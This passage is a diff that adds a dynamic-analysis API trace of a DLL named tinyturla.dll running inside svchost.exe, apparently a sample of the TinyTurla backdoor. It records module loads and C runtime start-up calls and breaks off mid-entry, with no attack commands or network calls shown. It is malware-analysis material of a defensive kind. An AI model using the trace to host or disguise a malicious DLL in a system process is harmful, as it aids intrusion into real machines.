@@ -1,0 +1,2353 @@
+Creation de Processus, pid [0x7d8] (C:\Windows\System32\sc.exe)
+
+Destruction de Processus, pid [0x7d8] (C:\Windows\System32\sc.exe)
+
+Monitored Dll \users\user\desktop\tinyturla\tinyturla.dll loaded in process pid = 0x254
+
+Thread created by monitored process : Now monitoring [pid 0x254][tid 0x4a4]
+
+
+********** Dumping PEB64 **********
+
+	Path : C:\Windows\system32\svchost.exe
+	Base : 0x00007FF7D90E0000
+	Size : 0xd000
+
+	Path : C:\Windows\SYSTEM32\ntdll.dll
+	Base : 0x00007FFF26E00000
+	Size : 0x1ac000
+
+	Path : C:\Windows\system32\KERNEL32.DLL
+	Base : 0x00007FFF26240000
+	Size : 0x13e000
+
+	Path : C:\Windows\system32\KERNELBASE.dll
+	Base : 0x00007FFF24360000
+	Size : 0x115000
+
+	Path : C:\Windows\SYSTEM32\sechost.dll
+	Base : 0x00007FFF24490000
+	Size : 0x59000
+
+	Path : C:\Windows\system32\RPCRT4.dll
+	Base : 0x00007FFF247A0000
+	Size : 0x141000
+
+	Path : c:\windows\system32\umpnpmgr.dll
+	Base : 0x00007FFF23160000
+	Size : 0x22000
+
+	Path : C:\Windows\system32\msvcrt.dll
+	Base : 0x00007FFF26500000
+	Size : 0xaa000
+
+	Path : c:\windows\system32\umpo.dll
+	Base : 0x00007FFF23140000
+	Size : 0x18000
+
+	Path : C:\Windows\SYSTEM32\umpoext.dll
+	Base : 0x00007FFF23130000
+	Size : 0x10000
+
+	Path : C:\Windows\SYSTEM32\cfgmgr32.dll
+	Base : 0x00007FFF242B0000
+	Size : 0x4f000
+
+	Path : C:\Windows\SYSTEM32\powrprof.dll
+	Base : 0x00007FFF23F00000
+	Size : 0x46000
+
+	Path : c:\windows\system32\pcwum.dll
+	Base : 0x00007FFF23120000
+	Size : 0xe000
+
+	Path : c:\windows\system32\HID.DLL
+	Base : 0x00007FFF23110000
+	Size : 0xd000
+
+	Path : C:\Windows\SYSTEM32\gpapi.dll
+	Base : 0x00007FFF230E0000
+	Size : 0x24000
+
+	Path : c:\windows\system32\rpcss.dll
+	Base : 0x00007FFF23010000
+	Size : 0xcc000
+
+	Path : C:\Windows\SYSTEM32\combase.dll
+	Base : 0x00007FFF24570000
+	Size : 0x211000
+
+	Path : c:\windows\system32\SspiCli.dll
+	Base : 0x00007FFF23D20000
+	Size : 0x2e000
+
+	Path : c:\windows\system32\bisrv.dll
+	Base : 0x00007FFF22EC0000
+	Size : 0x48000
+
+	Path : C:\Windows\system32\OLEAUT32.dll
+	Base : 0x00007FFF26770000
+	Size : 0xc1000
+
+	Path : c:\windows\system32\psmsrv.dll
+	Base : 0x00007FFF22DC0000
+	Size : 0x27000
+
+	Path : c:\windows\system32\lsm.dll
+	Base : 0x00007FFF22DF0000
+	Size : 0xc6000
+
+	Path : c:\windows\system32\SYSNTFY.dll
+	Base : 0x00007FFF22DB0000
+	Size : 0xc000
+
+	Path : c:\windows\system32\WMsgAPI.dll
+	Base : 0x00007FFF22DA0000
+	Size : 0x9000
+
+	Path : C:\Windows\system32\CRYPTBASE.dll
+	Base : 0x00007FFF23EC0000
+	Size : 0xb000
+
+	Path : C:\Windows\system32\bcryptPrimitives.dll
+	Base : 0x00007FFF23D50000
+	Size : 0x63000
+
+	Path : C:\Windows\System32\Userenv.dll
+	Base : 0x00007FFF234F0000
+	Size : 0x21000
+
+	Path : C:\Windows\system32\profapi.dll
+	Base : 0x00007FFF23F50000
+	Size : 0x15000
+
+	Path : c:\windows\system32\DEVOBJ.dll
+	Base : 0x00007FFF22D70000
+	Size : 0x28000
+
+	Path : C:\Windows\SYSTEM32\kernel.appcore.dll
+	Base : 0x00007FFF22D40000
+	Size : 0xb000
+
+	Path : c:\windows\system32\systemeventsbrokerserver.dll
+	Base : 0x00007FFF22CF0000
+	Size : 0x4c000
+
+	Path : C:\Windows\SYSTEM32\bi.dll
+	Base : 0x00007FFF22BB0000
+	Size : 0xb000
+
+	Path : c:\windows\system32\DAB.dll
+	Base : 0x00007FFF22B90000
+	Size : 0x1c000
+
+	Path : C:\Windows\SYSTEM32\clbcatq.dll
+	Base : 0x00007FFF26160000
+	Size : 0xb6000
+
+	Path : C:\Windows\SYSTEM32\wtsapi32.dll
+	Base : 0x00007FFF21880000
+	Size : 0x12000
+
+	Path : C:\Windows\SYSTEM32\WINSTA.dll
+	Base : 0x00007FFF23E60000
+	Size : 0x5a000
+
+	Path : C:\Windows\system32\ADVAPI32.dll
+	Base : 0x00007FFF26840000
+	Size : 0xaa000
+
+	Path : C:\Windows\SYSTEM32\user32.dll
+	Base : 0x00007FFF26380000
+	Size : 0x177000
+
+	Path : C:\Windows\system32\GDI32.dll
+	Base : 0x00007FFF265B0000
+	Size : 0x151000
+
+	Path : C:\Windows\SYSTEM32\CRYPTSP.dll
+	Base : 0x00007FFF237C0000
+	Size : 0x20000
+
+	Path : C:\Windows\system32\rsaenh.dll
+	Base : 0x00007FFF233E0000
+	Size : 0x36000
+
+	Path : C:\Windows\system32\bcrypt.dll
+	Base : 0x00007FFF23A10000
+	Size : 0x26000
+
+	Path : C:\Windows\System32\actxprxy.dll
+	Base : 0x00007FFF18740000
+	Size : 0x2c0000
+
+	Path : C:\Windows\System32\twinapi.dll
+	Base : 0x00007FFF19BE0000
+	Size : 0xc9000
+
+	Path : C:\Windows\SYSTEM32\shcore.dll
+	Base : 0x00007FFF224C0000
+	Size : 0xb2000
+
+	Path : c:\users\user\desktop\tinyturla\tinyturla.dll
+	Base : 0x00007FFF146B0000
+	Size : 0x4e000
+
+	Path : C:\Windows\SYSTEM32\WINHTTP.dll
+	Base : 0x00007FFF1DBB0000
+	Size : 0xc9000
+
+********** End Dump PEB64 **********
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E3508
+[STR]         -> "api-ms-win-core-synch-l1-2-0"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146c68f3
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F68 ("InitializeCriticalSectionEx")
+[RET] 0x7fff146c697d in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E34C8
+[STR]         -> "api-ms-win-core-fibers-l1-1-1"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146c68f3
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F30 ("FlsAlloc")
+[RET] 0x7fff146c697d in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F58 ("FlsSetValue")
+[RET] 0x7fff146c697d in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E3508
+[STR]         -> "api-ms-win-core-synch-l1-2-0"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146d1b75
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F68 ("InitializeCriticalSectionEx")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E34C8
+[STR]         -> "api-ms-win-core-fibers-l1-1-1"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146d1b75
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F30 ("FlsAlloc")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F48 ("FlsGetValue")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F58 ("FlsSetValue")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetStartupInfoW> in [KERNEL32.DLL] 
+[PAR] LPSTARTUPINFOW lpStartupInfo : 0x000000F43ECEF100
+[RET] 0x7fff146d175e in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetCommandLineA> in [KERNEL32.DLL] 
+[RET] 0x7fff146d603a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetCommandLineW> in [KERNEL32.DLL] 
+[RET] 0x7fff146d6047 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetACP> in [KERNEL32.DLL] 
+[RET] 0x7fff146d5747 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <IsValidCodePage> in [KERNEL32.DLL] 
+[RET] 0x7fff146d5d59 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x7fff146d5da5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetCPInfo> in [KERNEL32.DLL] 
+[RET] 0x7fff146d5858 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000F43ECEE980
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x7fff146d3b30 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000F43ECEE980
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x000000F43ECEE6B0
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x7fff146d3bd6 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetStringTypeW> in [KERNEL32.DLL] 
+[RET] 0x7fff146d3bf0 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000F43ECEE980
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x7fff146d3cd4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000F43ECEE980
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x000000F43ECEE650
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x7fff146d3d79 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LoadLibraryExW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpFileName : 0x00007FFF146E7600
+[STR]         -> "api-ms-win-core-localization-l1-2-1"
+[PAR] DWORD   dwFlags    : 0x800 (LOAD_LIBRARY_SEARCH_SYSTEM32)
+[RET] 0x7fff146d1b75
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF24360000 ("KERNELBASE.dll")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E22F8 ("LCMapStringEx")
+[RET] 0x7fff146d1c2a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LCMapStringEx> in [KERNELBASE.dll] 
+[RET] 0x7fff146d21eb in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LCMapStringEx> in [KERNELBASE.dll] 
+[RET] 0x7fff146d21eb in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000F43ECEE440
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x000000F43ECEEA80
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7fff146d3ee4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000F43ECEE980
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x0
+[PAR] int    cchWideChar    : 0x0
+[RET] 0x7fff146d3cd4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <MultiByteToWideChar> in [KERNEL32.DLL] 
+[PAR] UINT   CodePage       : 0x4e4 (windows-1252)
+[PAR] DWORD  dwFlags        : 0x1 (MB_PRECOMPOSED)
+[PAR] LPCCH  lpMultiByteStr : 0x000000F43ECEE980
+[PAR] int    cbMultiByte    : 0x100
+[PAR] LPWSTR lpWideCharStr  : 0x000000F43ECEE650
+[PAR] int    cchWideChar    : 0x100
+[RET] 0x7fff146d3d79 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LCMapStringEx> in [KERNELBASE.dll] 
+[RET] 0x7fff146d21eb in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <LCMapStringEx> in [KERNELBASE.dll] 
+[RET] 0x7fff146d21eb in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <WideCharToMultiByte> in [KERNEL32.DLL] 
+[PAR] UINT    CodePage          : 0x1252 (windows-1252)
+[PAR] DWORD   dwFlags           : 0x0 
+[PAR] LPCWSTR lpWideCharStr     : 0x000000F43ECEE440
+[PAR] int     cchWideChar       : 0x100
+[PAR] LPSTR   lpMultiByteStr    : 0x000000F43ECEEB80
+[PAR] int     cbMultiByte       : 0x100
+[PAR] LPCCH   lpDefaultChar     : 0x0
+[PAR] LPBOOL  lpUsedDefaultChar : 0x0
+[RET] 0x7fff146d3ee4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <RtlInitializeSListHead> in [ntdll.dll] 
+[RET] 0x7fff146c11ae in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetModuleHandleW> in [KERNEL32.DLL] 
+[PAR] LPCWSTR lpModuleName : 0x00007FFF146E1F10 ("kernel32.dll")
+[RET] 0x7fff146c00ff in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F30 ("FlsAlloc")
+[RET] 0x7fff146c0112 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F40 ("FlsFree")
+[RET] 0x7fff146c0129 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F48 ("FlsGetValue")
+[RET] 0x7fff146c0140 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F58 ("FlsSetValue")
+[RET] 0x7fff146c0157 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F68 ("InitializeCriticalSectionEx")
+[RET] 0x7fff146c016e in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1F88 ("InitOnceExecuteOnce")
+[RET] 0x7fff146c0185 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1FA0 ("CreateEventExW")
+[RET] 0x7fff146c019c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1FB0 ("CreateSemaphoreW")
+[RET] 0x7fff146c01b3 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1FC8 ("CreateSemaphoreExW")
+[RET] 0x7fff146c01ca in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1FE0 ("CreateThreadpoolTimer")
+[RET] 0x7fff146c01e1 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E1FF8 ("SetThreadpoolTimer")
+[RET] 0x7fff146c01f8 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2010 ("WaitForThreadpoolTimerCallbacks")
+[RET] 0x7fff146c020f in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2030 ("CloseThreadpoolTimer")
+[RET] 0x7fff146c0226 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2048 ("CreateThreadpoolWait")
+[RET] 0x7fff146c023d in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2060 ("SetThreadpoolWait")
+[RET] 0x7fff146c0254 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2078 ("CloseThreadpoolWait")
+[RET] 0x7fff146c026b in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2090 ("FlushProcessWriteBuffers")
+[RET] 0x7fff146c0282 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E20B0 ("FreeLibraryWhenCallbackReturns")
+[RET] 0x7fff146c0299 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E20D0 ("GetCurrentProcessorNumber")
+[RET] 0x7fff146c02b0 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E20F0 ("CreateSymbolicLinkW")
+[RET] 0x7fff146c02c7 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2108 ("GetCurrentPackageId")
+[RET] 0x7fff146c02de in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2120 ("GetTickCount64")
+[RET] 0x7fff146c02f5 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2130 ("GetFileInformationByHandleEx")
+[RET] 0x7fff146c030c in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2150 ("SetFileInformationByHandle")
+[RET] 0x7fff146c0323 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2170 ("GetSystemTimePreciseAsFileTime")
+[RET] 0x7fff146c033a in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2190 ("InitializeConditionVariable")
+[RET] 0x7fff146c0351 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E21B0 ("WakeConditionVariable")
+[RET] 0x7fff146c0368 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E21C8 ("WakeAllConditionVariable")
+[RET] 0x7fff146c037f in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E21E8 ("SleepConditionVariableCS")
+[RET] 0x7fff146c0396 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2208 ("InitializeSRWLock")
+[RET] 0x7fff146c03ad in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
+[API] <GetProcAddress> in [KERNEL32.DLL] 
+[PAR] HMODULE hModule    : 0x00007FFF26240000 ("KERNEL32.DLL")
+[PAR] LPCSTR  lpProcName : 0x00007FFF146E2220 ("AcquireSRWLockExclusive")
+[RET] 0x7fff146c03c4 in [tinyturla.dll]
+
+[ * ] [pid 0x254][tid 0x4a4] c:\windows\system32\svchost.exe
